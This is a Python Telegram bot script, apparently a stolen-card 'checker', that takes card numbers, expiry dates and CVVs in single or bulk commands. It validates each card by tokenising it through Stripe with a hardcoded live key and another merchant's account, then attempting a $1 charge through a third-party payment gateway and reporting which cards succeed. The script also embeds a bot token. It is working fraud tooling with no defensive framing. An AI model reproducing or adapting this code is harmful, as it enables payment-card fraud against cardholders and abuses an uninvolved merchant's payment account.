import requests, telebot, json, time

bot_token='5771295057:AAGoHyccEPvNgs6dp2KY_ygrvW4hzYMCt6E'

bot = telebot.TeleBot(bot_token) 

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
  global card_number, exp_month, exp_year, cvv, cc
  if '/chk' in message.text:
    
    oldmsg = bot.reply_to(message, 'Please wait...')
    start_time=time.perf_counter()

    try:
      cc=message.text.replace('/chk ','').replace(' ','|').replace('/','|')
      ccvalues=cc.split('|')
      card_number=ccvalues[0]
      exp_month=ccvalues[1]
      exp_year=ccvalues[2]
      cvv=ccvalues[3]
    except:
      pass
      
    stripe()
        
    end_time=time.perf_counter()
    total=str(round(end_time-start_time, 1))

    bot.edit_message_text(chat_id=message.chat.id, message_id=oldmsg.message_id, text='💳 Card: '+cc+'\n📍'+response+'\nℹ️ Took '+total+'')


#################################################
  
  
  elif '/mass' in message.text:
    ccs=message.text.replace('/mass ','').replace(' ','|').replace('/','|').split('\n')
    if ccs==ccs:
      resultlist=''
      oldmsg = bot.reply_to(message, 'Please wait...')
      total_time_start=time.perf_counter()
      for x in range(len(ccs)):
        start_time=time.perf_counter()

        try:
          cc=ccs[0]
          ccs.pop(0)
          ccvalues=cc.split('|')
          card_number=ccvalues[0]
          exp_month=ccvalues[1]
          exp_year=ccvalues[2]
          cvv=ccvalues[3]
        except:
          pass
          
        stripe()

        end_time=time.perf_counter()
        total=str(round(end_time-start_time, 1))
        result='💳 Card: '+cc+'\n📍'+response+'\nℹ️ Took '+total+''
        resultlist=resultlist+'\n----------------\n'+result
        bot.edit_message_text(chat_id=message.chat.id, message_id=oldmsg.message_id, text=resultlist)
        
        
      total_time_end=time.perf_counter()
      total_time=str(round(total_time_end-total_time_start, 1))
      bot.edit_message_text(chat_id=message.chat.id, message_id=oldmsg.message_id, text=resultlist+'\n-------------\nChecking Ended, Took '+total_time+'s')


#################################################

def stripe():
  global response

  try:
    data={"type": "card",
         "card[number]": card_number,
         "card[cvc]": cvv,
         "card[exp_month]": exp_month,
         "card[exp_year]": exp_year,
         "guid": "dd8e5ba7-fc1e-4a95-a79c-2151b280d2594418cb",
         "muid": "cd62da2e-e9b7-4b7c-9a48-d9576fbad943891f3e",
         "sid": "7baaccb9-b21b-4349-b511-5b212f0701dc98bee9",
         "pasted_fields": "number",
         "payment_user_agent": "stripe.js%2F81d4ec47a%3B+stripe-js-v3%2F81d4ec47a",
         "time_on_page": "50096",
         "key": "pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K",
         "_stripe_account": "acct_1KWSbmPh600eb56s"}
    token=requests.post('https://api.stripe.com/v1/payment_methods',data=data).json()
    token=token['id']
  except:
    result=token['error']['code']
    message=token['error']['message']
    response=message+' '+result+' ❌'
  else:
    
    json={"email": "aksdok@gmail.com",
          "clientID": "ac5cf009-f90b-4fa2-89f7-f2992dd4bcbe",
          "ammount": 1.00, 
          "paymentMethod": token}
    setupintents=requests.post('https://app.theauxilia.com/gatewayapi/Merchant/InitializePayment',json=json).json()
    seti_secret=setupintents['token']
    seti=setupintents['intentID']
    
    data={"expected_payment_method_type": "card",
         "use_stripe_sdk": "true",
         "key": "pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K",
         "_stripe_account": "acct_1KWSbmPh600eb56s",
         "client_secret": seti_secret}
    charge=requests.post('https://api.stripe.com/v1/setup_intents/'+seti+'/confirm',data=data)

    if '"status": "succeeded"' in charge.text:
      response='$1 Charged! ✅'
    elif '"status": "requires_action"' in charge.text:
      response='3D Secure requires_action ❌'
    else:
      try:
        result=charge.json()['error']['code']
      except:
        pass
      try:
        result=charge.json()['error']['decline_code']
      except:
        pass
      try:
        msg=charge.json()['error']['message']
      except:
        pass
      response=msg+' '+result+' ❌'
bot.polling(none_stop=True, interval=0)
